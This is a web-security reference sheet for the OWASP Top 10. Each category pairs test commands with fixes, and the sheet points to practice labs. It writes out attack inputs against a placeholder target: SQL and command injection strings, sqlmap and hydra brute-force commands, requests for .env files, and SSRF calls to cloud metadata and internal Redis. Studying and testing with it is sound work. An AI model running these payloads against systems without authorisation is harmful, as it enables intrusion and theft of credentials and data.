# OWASP Top 10 — tools, payloads, and defenses per category

Reference for what to test, how to test it, and how to fix it.

## A01 — Broken Access Control

Test: change user ID in URL/body. Access admin endpoints as regular user. Use Burp Autorize.
```bash
curl http://target/api/orders/1002 -H "Authorization: Bearer USER_1_TOKEN"
curl http://target/admin/users -b "session=regular_user_cookie"
```
Fix: server-side authorization check on every resource access. Never trust client-supplied role.

## A02 — Cryptographic Failures

Test: check if HTTPS enforced. Check what hash algorithm stores passwords. Inspect cookies for sensitive data.
```bash
curl -I http://target.com             # check for HTTPS redirect
curl -v https://target.com 2>&1 | grep "SSL certificate"
# Check response for password hashes or keys in API responses
```
Fix: TLS everywhere, HSTS header, bcrypt/argon2 for passwords, no secrets in responses.

## A03 — Injection (SQL, Command, LDAP)

Test: inject into every input field and URL parameter.
```bash
sqlmap -u "http://target/search?q=test" --batch --dbs
# Manual: ' OR 1=1-- in any field
# Command: 127.0.0.1; id in ping/traceroute inputs
```
Fix: parameterized queries, no string concatenation in queries, input validation.

## A04 — Insecure Design

Test: logic flaws — skip steps in multi-step flows, replay old requests, negative values.
```bash
# Try negative quantity in shopping cart
curl http://target/api/cart -X POST -d '{"item":"x","qty":-1}'
# Try coupon code reuse — apply same code twice
```
Fix: threat modeling at design phase, enforce business rules server-side.

## A05 — Security Misconfiguration

Test: default creds, directory listing, verbose errors, debug endpoints.
```bash
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
curl http://target.com/.env
curl http://target.com/phpinfo.php
# Try admin/admin, admin/password, root/root
```
Fix: apply hardening guides, disable default accounts, suppress error details in production.

## A06 — Vulnerable and Outdated Components

Test: identify versions, check against CVE databases.
```bash
npm audit                        # Node.js
pip-audit                        # Python
trivy image myapp:latest         # containers
snyk test                        # multi-language (free tier)
# Check server headers for version: curl -I http://target.com → Server: Apache/2.4.29
```
Fix: dependency update process, automated scanning in CI/CD, uninstall unused components.

## A07 — Authentication Failures

Test: brute force with no lockout, username enumeration via error messages, weak password reset.
```bash
# Brute force test (lab/authorized systems only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "http://target/login:username=^USER^&password=^PASS^:Invalid"

# Username enumeration — compare responses
curl http://target/login -d "user=admin&pass=x"      # "Invalid password"
curl http://target/login -d "user=nobody&pass=x"     # "Invalid username"
# Different messages = enumeration possible
```
Fix: same error message for all auth failures, rate limiting, account lockout, MFA.

## A08 — Software and Data Integrity

Test: check if downloads are verified with hashes. Check for CI/CD pipeline tampering.
```bash
# Verify download hash
sha256sum downloaded_file.tar.gz
# Compare with published hash on release page

# Check JS files for Subresource Integrity attributes
curl http://target.com | grep -i "integrity="
```
Fix: SRI for CDN scripts, signed artifacts, verified package sources.

## A09 — Logging and Monitoring Failures

Test: trigger errors and attacks — check if anything appears in logs.
```bash
# Cause a 500 error, a 401, a SQLi attempt
# Then check: is it in the logs? Is there an alert?
curl http://target/login -d "user=' OR 1=1--&pass=x"
# No log entry = logging failure
```
Fix: structured logging, centralized log aggregation (ELK/Splunk), alert on anomalies.

## A10 — Server-Side Request Forgery

Test: find URL parameters and point them at internal addresses.
```bash
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://localhost:6379/INFO"   # Redis
curl "http://target/fetch?url=http://10.0.0.1/"
```
Fix: allowlist permitted outbound destinations, block cloud metadata IPs (169.254.169.254), use network-level egress filtering.

## Practice

PortSwigger full learning path: https://portswigger.net/web-security/all-labs
OWASP Juice Shop — covers all 10: `docker run -d -p 3000:3000 bkimminich/juice-shop`
